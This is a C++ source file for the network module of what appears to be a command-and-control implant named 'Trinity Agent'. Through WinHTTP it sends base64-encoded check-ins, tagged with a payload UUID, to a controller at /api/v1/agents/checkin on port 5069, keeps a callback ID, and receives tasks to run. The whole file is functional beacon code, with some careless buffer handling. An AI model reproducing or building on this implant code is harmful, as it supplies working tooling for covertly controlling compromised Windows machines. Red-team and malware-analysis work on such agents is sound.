//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
#include "CommManager.h"
#include "base64.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#ifndef PAYLOAD_UUID
	#define PAYLOAD_UUID "0c71632c-217f-46ce-bb81-dbfd32dd18ac"
#endif

#ifndef HOST
	#define HOST "localhost"
#endif

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Default constructor 
CommManager::CommManager()
{
	payloaddUUID = PAYLOAD_UUID;
	host = HOST;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Intial checkin 
void CommManager::IntialCheckin(const std::string& json)
{
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	BOOL bResults = FALSE;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR Buffer = NULL;
	std::string result;

	hSession = WinHttpOpen(
		L"Trinity Agent Client/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession)
	{
		std::wstring wideHost(host.begin(), host.end());
		hConnect = WinHttpConnect(hSession, wideHost.c_str(), 5069, 0);
	}

	if (hConnect)
	{
		hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	}

	LPCWSTR pwszHeaders = L"Content-Type: application/json\r\n";
	std::string strData = base64::to_base64(payloaddUUID + json);
	LPVOID lpOptional = (LPVOID)strData.c_str();
	DWORD dwOptionalLength = (DWORD)strData.length();

	if (hRequest)
	{
		bResults = WinHttpSendRequest(
			hRequest,
			pwszHeaders,
			(DWORD)-1L,
			(LPVOID)strData.c_str(),
			(DWORD)strData.length(),
			(DWORD)strData.length(),
			0);
	}

	if (bResults)
	{
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	}
	if (bResults)
	{
		do {
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				std::cerr << "[x] Error " << GetLastError() << " in WinHttpQueryDataAvaliable.\n";
			}
			// No Tasks have been issued
			if (dwSize == 0) break;

			Buffer = new char[dwSize + 1];
			if (!Buffer)
			{
				std::cerr << "[x] Could not allocate buffer. \n";
				break;
			}

			ZeroMemory(Buffer, dwSize + 1);
			if (!WinHttpReadData(hRequest, (LPVOID)Buffer, dwSize, &dwDownloaded))
			{
				std::cerr << "[x] Error " << GetLastError() << " in WinHttpReadData.\n";
			}
			else
			{
				std::cout << Buffer;
			}

		} while (dwSize > 0);

		result = std::string(Buffer);
		callbackUUID = base64::from_base64(result);
		delete[] Buffer;
	}
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Full-established checkin 
std::string CommManager::Checkin(const std::string& json)
{
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	BOOL bResults = FALSE;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR Buffer = NULL;
	std::string result;

	hSession = WinHttpOpen(
		L"Trinity Agent Client/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession)
	{
		std::wstring wideHost(host.begin(), host.end());
		hConnect = WinHttpConnect(hSession, wideHost.c_str(), 5069, 0);
	}

	if (hConnect)
	{
		hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	}

	LPCWSTR pwszHeaders = L"Content-Type: application/json\r\n";


	std::string strData = base64::to_base64(callbackUUID + json);
	LPVOID lpOptional = (LPVOID)strData.c_str();
	DWORD dwOptionalLength = (DWORD)strData.length();

	if (hRequest)
	{
		bResults = WinHttpSendRequest(
			hRequest,
			pwszHeaders,
			(DWORD)-1L,
			(LPVOID)strData.c_str(),
			(DWORD)strData.length(),
			(DWORD)strData.length(),
			0);
	}

	if (bResults)
	{
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	}
	if (bResults)
	{
		do {
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				std::cerr << "[x] Error " << GetLastError() << " in WinHttpQueryDataAvaliable.\n";
			}
			// No Tasks have been issued
			if (dwSize == 0) break;

			Buffer = new char[dwSize + 1];
			if (!Buffer)
			{
				std::cerr << "[x] Could not allocate buffer. \n";
				break;
			}

			ZeroMemory(Buffer, dwSize + 1);
			if (!WinHttpReadData(hRequest, (LPVOID)Buffer, dwSize, &dwDownloaded))
			{
				std::cerr << "[x] Error " << GetLastError() << " in WinHttpReadData.\n";
			}
			else
			{
				std::cout << Buffer;
			}
			
		} while (dwSize > 0);

		if (Buffer != NULL)
		{
			result = base64::from_base64(std::string(Buffer));
		}

		delete[] Buffer;
	}
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return result;
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//